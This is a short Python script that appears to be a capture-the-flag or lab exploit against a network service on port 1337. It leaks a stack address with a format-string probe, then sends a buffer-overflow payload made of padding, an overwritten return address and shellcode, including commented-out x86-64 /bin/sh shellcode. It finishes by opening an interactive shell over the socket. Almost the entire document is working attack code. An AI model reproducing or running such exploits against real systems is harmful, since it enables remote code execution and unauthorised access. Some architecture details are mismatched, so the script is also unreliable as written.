from telnetlib import Telnet
import socket
import struct

# socket creation
s = socket.socket()
s.connect(('192.168.178.242', 1337))
#s.connect(('127.0.0.1', 1337))
r = s.recv(1024)
s.send("%p,%p,%p\n")
while ',' not in r:
    r = s.recv(1024)
start_buf = int(r.split(',')[1], 16)-9 # compensate for offset

print("leaked start of buffer: 0x{:08x}".format(start_buf))

raw_input("EXPLOIT READY: PRESS ANY KEY TO START")
padding = "B" * 257
RIP = struct.pack("Q", start_buf + len(padding) + 8)  # 8 compensate for RIP
# shellcode = "\xcc"*64

shellcode = b"\x01\x60\x8f\xe2\x16\xff\x2f\xe1\x06\x22\x79\x46\x0e\x31\x01\x20\x04\x27\x01\xdf\x24\x1b\x20\x1c\x01\x27\x01\xdf\x68\x65\x6c\x6c\x6f\x0a\x00\x00"
#shellcode = b"\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"
#shellcode = b"\x90\x00\x00\x58\x21\x00\x00\x71\x3b\x00\x00\xd4\x00\x00\x00\xd4\x93\x00\x00\xd4\x00\x00\x00\x58"

payload = padding + RIP + shellcode
s.send(payload)

# allows to still interact with the socket after spawning the shell
t = Telnet()
t.sock = s
t.interact()
s.close()
